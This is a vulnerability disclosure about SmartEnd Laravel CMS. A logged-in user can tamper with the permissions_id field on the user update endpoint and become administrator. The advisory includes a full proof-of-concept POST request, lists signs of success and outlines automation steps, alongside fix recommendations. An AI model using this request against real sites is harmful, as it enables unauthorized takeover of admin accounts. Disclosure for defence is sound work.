# 🔓 SmartEnd Laravel CMS - Privilege Escalation via Role Tampering  

📌 **Product Information**  
**Platform**: Laravel (CMS: SmartEnd Laravel CMS)  
**Affected Feature**: User Role Update Endpoint  
**Tested Vulnerability**: Privilege Escalation via `permissions_id` Parameter Tampering  
**CVE**: Not Assigned  
**Severity**: Critical (Authenticated Privilege Escalation to Admin)  
**CWE ID**: CWE-269  
**CWE Name**: Improper Privilege Management  
**Patched**: ❌ Not Applicable  
**Patch Priority**: 🔴 High  
**Date Published**: June 13, 2025  
**Researcher**: yucaerin  
**Link Product**: https://codecanyon.net/item/smartend-laravel-admin-dashboard/19184332  

---

⚠️ **Summary of the Vulnerability**  
SmartEnd Laravel CMS allows authenticated users to update their own profile via:

```
POST /admin/users/[user_id]/update
```

However, this endpoint does **not** enforce any backend authorization check on the `permissions_id` field. By modifying this field in the request, an attacker can escalate their role from a basic user (e.g. Subscriber) to an Administrator.

## 🧪 Proof of Concept (PoC)  
**Sample POST Request:**
```http
POST /admin/users/6/update HTTP/2
Host: [REDACTED].com
Cookie: [VALID AUTH COOKIE]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="_token"

[CSRF_TOKEN]
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="name"

testuser
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="email"

testuser@example.com
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="permissions_id"

1
------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundaryXYZ--
```

🧾 **Explanation of Key Parameter:**
- `permissions_id=3` → Subscriber (default)
- `permissions_id=1` → Administrator  
Changing this field directly escalates user privileges.

✅ **Indicators of Success:**
- HTTP 302 redirect to admin dashboard.
- Access to admin-only pages (e.g., `/admin/settings`) now permitted.
- User can now manage all users and system settings.

## 🔍 Where’s the Flaw?
- No server-side verification of who is allowed to change `permissions_id`.
- Trusting client input for sensitive access controls.
- No RBAC (Role-Based Access Control) enforcement in the update logic.

## 🔐 Recommendation
- Validate that only existing admins can assign or change `permissions_id`.
- Implement server-side RBAC checks to restrict role modification.
- Sanitize and whitelist acceptable values for critical fields.
- Log and alert on permission level changes.

## ⚙️ Optional Automation Features
A script can be written to:
- Log in as a standard user.
- Retrieve CSRF token from the edit page.
- Submit the tampered form with `permissions_id=1`.
- Confirm privilege escalation by visiting admin-only areas.

## ⚠️ Disclaimer  
This disclosure is for **educational and authorized security testing** only.  
Do **not** exploit this issue on live systems without explicit permission.  
Unauthorized access is illegal and unethical.
